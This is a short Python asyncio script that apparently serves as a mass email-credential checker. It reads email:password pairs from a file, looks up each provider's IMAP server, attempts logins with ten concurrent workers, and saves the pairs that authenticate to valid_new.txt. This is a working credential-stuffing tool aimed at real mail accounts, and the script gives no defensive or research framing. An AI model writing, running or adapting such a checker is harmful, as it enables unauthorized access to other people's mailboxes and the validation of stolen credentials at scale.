import random
import asyncio
from timeit import default_timer as timer

from aioimaplib import aioimaplib #pip3 install aioimaplib
import aiofiles #pip3 install aioimaplib
#import uvloop #pip3 instal uvloop
#asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
#uvloop does not work with aioimaplib

q = asyncio.Queue()

async def init_imapsettings():
    global ImapConfig
    ImapConfig = {}
    async with aiofiles.open("hoster.txt", mode='r') as f:
        async for line in f:
            if len(line)>1:
                hoster = line.strip().split(':')
                ImapConfig[hoster[0]] = hoster[1]

@asyncio.coroutine
def check_mailbox(host, user, password):
    imap_client = aioimaplib.IMAP4_SSL(host=host)#,timeout=4
    #print ("connecting")
    yield from imap_client.wait_hello_from_server()
    a = yield from imap_client.login(user, password)
    yield from imap_client.logout()
    #print ("logged out")
    if 'OK' in a:
        return True
    elif 'authentication failed' in a:
        return False

async def sum(x):
    c = x.split(':')
    try:
        h = ImapConfig[c[0].lower().split('@')[1]]
    except:
        print ("No settings found for:",x)
        return x
    check = await check_mailbox(h, c[0], c[1])
    if check:
        print (True, x)
        async with aiofiles.open('valid_new.txt', 'a') as f:
            await f.write(x+'\n')
    else:
        print (False, x)
    await asyncio.sleep(0.001)  # simulates asynchronously
    return x

async def consumer(i):
    while True:
        f, x = await q.get()
        r = await sum(x)
        f.set_result(r)

async def producer():
    await init_imapsettings()
    consumers = [asyncio.ensure_future(consumer(i)) for i in range(10)]
    loop = asyncio.get_event_loop()
    tasks = [(asyncio.Future(), line.strip()) for line in open('log.txt')]
    for task in tasks:
        await q.put(task)
    # wait until all futures are completed
    results = await asyncio.gather(*[f for f, _ in tasks])
    assert results == [r for _, r in tasks]

    # destroy tasks
    for c in consumers:
        c.cancel()

start = timer()
asyncio.get_event_loop().run_until_complete(producer())
end = timer()
print ("\nTime passed: " + str(end - start))
